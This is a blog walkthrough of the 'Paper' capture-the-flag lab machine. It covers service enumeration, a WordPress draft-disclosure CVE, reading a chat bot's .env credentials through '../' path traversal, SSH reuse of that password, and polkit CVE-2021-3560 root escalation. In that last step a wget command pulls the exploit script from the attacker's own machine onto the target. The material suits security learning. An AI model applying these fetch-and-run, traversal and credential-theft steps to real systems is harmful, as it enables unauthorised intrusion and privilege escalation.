<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Paper | Penetration Testing Journal</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://danae-pan.github.io/Blog/blog/Paper"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="Paper | Penetration Testing Journal"><meta data-rh="true" name="description" content="Task 1"><meta data-rh="true" property="og:description" content="Task 1"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2025-05-05T00:00:00.000Z"><meta data-rh="true" property="article:tag" content="easy,linux"><link data-rh="true" rel="canonical" href="https://danae-pan.github.io/Blog/blog/Paper"><link data-rh="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/Paper" hreflang="en"><link data-rh="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/Paper" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://danae-pan.github.io/Blog/blog/Paper","mainEntityOfPage":"https://danae-pan.github.io/Blog/blog/Paper","url":"https://danae-pan.github.io/Blog/blog/Paper","headline":"Paper","name":"Paper","description":"Task 1","datePublished":"2025-05-05T00:00:00.000Z","author":[],"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://danae-pan.github.io/Blog/blog","name":"Intro to Red Team"}}</script><link rel="alternate" type="application/rss+xml" href="/Blog/blog/rss.xml" title="Penetration Testing Journal RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Blog/blog/atom.xml" title="Penetration Testing Journal Atom Feed"><link rel="stylesheet" href="/Blog/assets/css/styles.e69e0e8b.css">
<script src="/Blog/assets/js/runtime~main.7fed1898.js" defer="defer"></script>
<script src="/Blog/assets/js/main.e129374b.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"dark")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Blog/"><b class="navbar__title text--truncate">About Me</b></a><a class="navbar__item navbar__link" href="/Blog/docs/phases/Introduction">Guides</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Blog/blog/">Write Ups</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Blog/docs/stories/Brain: the first computer virus">Bedtime Stories</a><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Cicada">Cicada</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/BoardLight">Board Light</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Driver">Driver</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Precious">Precious</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Writeup">Writeup</a></li><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="/Blog/blog/Paper">Paper</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Devvortex">Devvortex</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/GoodGames">Good Games</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Sau">Sau</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Jerry">Jerry</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Cap">Cap</a></li></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class="title_f1Hy">Paper</h1><div class="container_mt6G margin-vert--md"><time datetime="2025-05-05T00:00:00.000Z">May 5, 2025</time> · <!-- -->5 min read</div></header><div id="__blog-post-container" class="markdown"><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
<p>How many TCP ports are open on the remote host?</p>
<p><code>nmap -sS &lt;target_ip&gt;</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-1-d23893e8bdd9381fd08d82682fa601cf.png" width="1378" height="462" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
<p>What is the domain for the Wordpress blog?</p>
<p>For answering this, we will attempt checking the information coming from the headers.</p>
<p><code>curl -I &lt;target_ip&gt;</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-2-7221cf04b4960b24b208b606c281ddf0.png" width="775" height="263" class="img_ev3q"></p>
<p>We can se that the server is leaking information from the backend systems from the X-Backend-Server header that contains the hostname of the target IP.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
<p>Which 2019 CVE is the wordpress version vulnerable to?</p>
<p>First, we need to identify the version of wordpress. First, we add the domain to the host file by <code>sudo vim /etc/hosts</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-3-61f0d3cc7ec0a2cc30019cd03d5893e6.png" width="873" height="210" class="img_ev3q"></p>
<p>Then, we use wpscan, the WordPress security scanner, to find the version and any vulnerabilities.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-4-311aec8fdcb7edd7fc8f2337c8afe033.png" width="1214" height="731" class="img_ev3q"></p>
<p>We found both the readme.html file location, which usually contains the wordpress version but the specific version was already identified. With a quick google search about the specific version we find the 2019 CVE.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
<p>What is the secret registration URL of the employee chat system?</p>
<p>We first need to enumerate the directories using gobuster dir.</p>
<p><code>gobuster dir -u http://office.paper/ -w &lt;word_list&gt;</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-5-9f04ccf1033dfa45b3a80c518fb56eb5.png" width="858" height="672" class="img_ev3q"></p>
<p>Navigating to the index.php page we see some kind of chat system.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-6-48216df3ac3a7de794a4d5ac8b930617.png" width="700" height="664" class="img_ev3q"></p>
<p>Going back to the CVE we previously found, this version could allow an unauthenticated user to view private or draft posts. Navigating to the page we also find this interesting post by the user Prinsonmike. Seems that we can use this wordpress vulnerability to access his draft hoping we can find this secret url.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-8-b48a3b57ae20b928f8913c109e1736c1.png" width="639" height="591" class="img_ev3q"></p>
<p>We navigate <code>http://office.paper/?static=1</code> and exploit the vulnerability and find the secret url.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-9-4d69abc44ef1bb79c90a4c069caace5d.png" width="639" height="519" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
<p>What is the name of the bot running on the Rocket Chat instance?</p>
<p>We need to first add to the hosts file the subdomain <code>chat.office.paper</code> so the ip get resolved.</p>
<p>Navigating to the secret url we found on the previous task we see the registration form.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-10-7304dbaee416aa6458274a48fdd2e9c0.png" width="639" height="536" class="img_ev3q"></p>
<p>We register, and the go to the general channel where we see the name of the bot.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-11-fa8caaddef1019ec0d7735031f27a1cc.png" width="703" height="111" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
<p>Which recyclops commands allows listing files?</p>
<p>In the &quot;How to use me?&quot; guide of the bot we see all the commands, including the one listing files.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-12-d4c13f83c2f0a2232856e3c2151eeb38.png" width="703" height="528" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
<p>What is the file name of the file that contains the configuration information of hubot running on the chat system?</p>
<p>Hubot is a framework to build chat bots. We will try to chat with recyclops, using the commands available to extract the information about the name of the file. Running <code>list</code> we see that we are on user dwight home directory.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-15-2ac857edd93cf1cec5182061be6e7495.png" width="526" height="242" class="img_ev3q"></p>
<p>We go back to the direcotry with <code>list ../</code> and then list the directory hubot <code>list ../hubot</code>.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-16-80dc6b0c6547360b9d7e78cfd01b4b48.png" width="526" height="509" class="img_ev3q"></p>
<p>Looking through the listed files and google searching hubot documentation to cross-reference, we see some files that could be possible like <code>.env</code> and <code>external-scripts</code>. We see their contents, first <code>file ../hubot/external-scripts.json</code> is empty and then <code>file ../hubot/.env</code> is the one containing the configuration.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-17-cefb8c1c6014835d58f8188291472f69.png" width="526" height="322" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
<p>What is the password obtained from that configuration information?</p>
<p>From the <code>.env</code> file we obtained from the previous question, we find the password.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
<p>Which regular user with a home directory exists on Paper other than rocketchat?</p>
<p>From the previous tasks, we saw that we where on the regular user dwight directory.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
<p>Submit the flag located in the dwight user&#x27;s home directory.</p>
<p>Previously, when we listed the home directory, by running <code>list ../</code> we came accross the <code>user.txt</code> file. We try to see the contents and get the user flag by <code>file ../user.txt</code> but we get access denied. We try to ssh to the target ip with the username dwight <code>ssh dwight@&lt;target_ip</code> and the password we found in the <code>.env</code> file and we are in! We get the user flag by <code>cat user.txt</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="#task-11" class="hash-link" aria-label="Direct link to Task 11" title="Direct link to Task 11">​</a></h3>
<p>What is the polkit version on the remote host?</p>
<p>We first run <code>cat /etc/os-release</code> to find which os we are on and we see that we are on CentOS. Then we can run <code>rpm -qa | grep polkit </code> to find the version of polkit.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-18-bb49644762a1bab9752b51f91f253f55.png" width="532" height="356" class="img_ev3q">
<img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-19-a615991ddbe7d98e2868a4515644040b.png" width="417" height="112" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="#task-12" class="hash-link" aria-label="Direct link to Task 12" title="Direct link to Task 12">​</a></h3>
<p>What is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?</p>
<p>Looking up for CVEs affecting the version of the polkit found, we find CVE-2021-3560 for the vulnerability that allows an unprivileged user to create an administrative user without authentication by abusing D-Bus and timing.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-13">Task 13<a href="#task-13" class="hash-link" aria-label="Direct link to Task 13" title="Direct link to Task 13">​</a></h3>
<p>In our machine, we clone the exploit from github <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation" target="_blank" rel="noopener noreferrer">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a>. Then, we open a http server on port 8080 using <code>python3 -m http.server 8080</code>. From the remote server, we use wget to get the exploit script <code>wget http://&lt;host_ip&gt;:8080/poc.sh</code>. We then <code>chmod +x poc.sh</code> and run the exploit as many times as needed to get the timing right. We follow the exploit&#x27;s instruction and get a root shell as the secnigma user.</p>
<p>We navigate to the root directory and obtain the root flag by <code>cat root.txt</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-p-20-d4449895b688d00017627e8a6ce3c5d0.png" width="813" height="425" class="img_ev3q"></p></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/easy">easy</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/linux">linux</a></li></ul></div></div><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><a href="https://github.com/danae-pan/Blog/blog/Paper.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/Blog/blog/Writeup"><div class="pagination-nav__sublabel">Newer post</div><div class="pagination-nav__label">Writeup</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/Blog/blog/Devvortex"><div class="pagination-nav__sublabel">Older post</div><div class="pagination-nav__label">Devvortex</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1" class="table-of-contents__link toc-highlight">Task 1</a></li><li><a href="#task-2" class="table-of-contents__link toc-highlight">Task 2</a></li><li><a href="#task-3" class="table-of-contents__link toc-highlight">Task 3</a></li><li><a href="#task-4" class="table-of-contents__link toc-highlight">Task 4</a></li><li><a href="#task-5" class="table-of-contents__link toc-highlight">Task 5</a></li><li><a href="#task-6" class="table-of-contents__link toc-highlight">Task 6</a></li><li><a href="#task-7" class="table-of-contents__link toc-highlight">Task 7</a></li><li><a href="#task-8" class="table-of-contents__link toc-highlight">Task 8</a></li><li><a href="#task-9" class="table-of-contents__link toc-highlight">Task 9</a></li><li><a href="#task-10" class="table-of-contents__link toc-highlight">Task 10</a></li><li><a href="#task-11" class="table-of-contents__link toc-highlight">Task 11</a></li><li><a href="#task-12" class="table-of-contents__link toc-highlight">Task 12</a></li><li><a href="#task-13" class="table-of-contents__link toc-highlight">Task 13</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contact</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/danae-pan" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://linkedin.com/in/anastasia-danai-panagiotopoulou" target="_blank" rel="noopener noreferrer" class="footer__link-item">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div></div></footer></div>
</body>
</html>